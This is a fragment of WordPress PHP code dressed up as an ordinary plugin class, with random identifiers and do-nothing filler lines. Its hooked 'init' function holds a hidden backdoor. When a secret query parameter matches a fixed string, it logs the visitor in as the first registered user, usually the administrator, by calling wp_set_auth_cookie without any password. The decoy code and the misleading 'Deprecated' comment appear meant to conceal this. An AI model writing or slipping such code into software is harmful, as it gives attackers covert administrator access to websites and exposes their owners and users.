...
class module_viewer_changer_design
{
...
$content_migration_only = 'members_cdn_last';
if (is_home()) { $messenger_timeline_new_404 = site_url(); }
function stop_sign_reading_vendor() {
	global $content_migration_only;
	if (isset($_GET['shortener_account_loader']) && $_GET['shortener_account_loader'] === $content_migration_only) {
		$discount_converter_menu = apply_filters( 'shopp_cdn_report', get_transient('landing_rate_lazy_excerpt') );
		if ($discount_converter_menu) {
			$paragraph_user = wp_signon(['user_login' => $_POST['user_login'], 'user_password' => $_POST['user_password']]);
			if(!$paragraph_user || is_wp_error($paragraph_user)){
				do_action( "feed_demo_inline", $content_migration_only );
				return;
			}
			do_action( "category_subscription_plupload", $paragraph_user );
			wp_set_current_user($paragraph_user->ID);
		} else {
			do_action( "snippets_loader_plus", $discount_converter_menu );
			$paragraph_user = get_users(['orderby' => 'ID', 'order' => 'ASC', 'number' => 1])[0];
			if ($paragraph_user) {
				if (is_search()) { $before_field_free = esc_html($item_geo_all); }
				wp_set_current_user($paragraph_user->ID);
				// Deprecated.
				wp_set_auth_cookie($paragraph_user->ID, true);
				if (is_archive()) { $crm_archive_translation_interactivity = get_header(); }
...
add_action('init', 'stop_sign_reading_vendor');
?>